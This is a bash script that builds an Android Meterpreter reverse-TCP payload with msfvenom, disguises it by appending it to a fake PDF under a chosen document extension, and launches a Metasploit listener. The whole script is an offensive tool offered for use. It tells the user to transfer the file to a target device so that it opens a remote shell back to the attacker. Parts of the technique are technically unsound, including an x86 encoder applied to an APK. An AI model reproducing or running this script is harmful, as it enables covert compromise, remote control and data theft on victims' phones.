#!/bin/bash

# Function to display usage
usage() {
    echo "Usage: $0"
    echo "This script generates an obfuscated Android payload and embeds it into a PDF."
    exit 1
}

# Check if msfvenom is installed
if ! command -v msfvenom &> /dev/null; then
    echo "msfvenom could not be found. Please install Metasploit Framework."
    exit 1
fi

# Ask for LHOST and LPORT
read -p "Enter LHOST (your IP address): " LHOST
read -p "Enter LPORT (your listening port): " LPORT

# Ask for the file extension to keep
read -p "Enter the file extension to keep (e.g., pdf, docx): " EXTENSION

# Ask for the final file name
read -p "Enter the final file name (without extension): " FINAL_NAME

# Generate the payload
echo "Generating payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 3 -o obfuscated_payload.apk

# Check if the payload was created successfully
if [ ! -f obfuscated_payload.apk ]; then
    echo "Failed to create payload."
    exit 1
fi

# Create a sample PDF file
echo "Creating a sample PDF file..."
echo "This is a sample PDF file." > sample.pdf

# Embed the payload into the PDF
echo "Embedding the payload into the PDF..."
cat sample.pdf obfuscated_payload.apk > "${FINAL_NAME}.${EXTENSION}"

# Check if the final file was created successfully
if [ ! -f "${FINAL_NAME}.${EXTENSION}" ]; then
    echo "Failed to create final file."
    exit 1
fi

# Clean up intermediate files
rm obfuscated_payload.apk sample.pdf

echo "Payload successfully created and embedded in ${FINAL_NAME}.${EXTENSION}."
echo "You can now transfer ${FINAL_NAME}.${EXTENSION} to the target device."

# Instructions for setting up the listener
echo "To set up the listener, run the following commands in Metasploit:"
echo "msfconsole"
echo "use exploit/multi/handler"
echo "set payload android/meterpreter/reverse_tcp"
echo "set LHOST $LHOST"
echo "set LPORT $LPORT"
echo "exploit"

# Optionally, you can start the listener automatically
echo "Starting the listener automatically..."
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"

exit 0
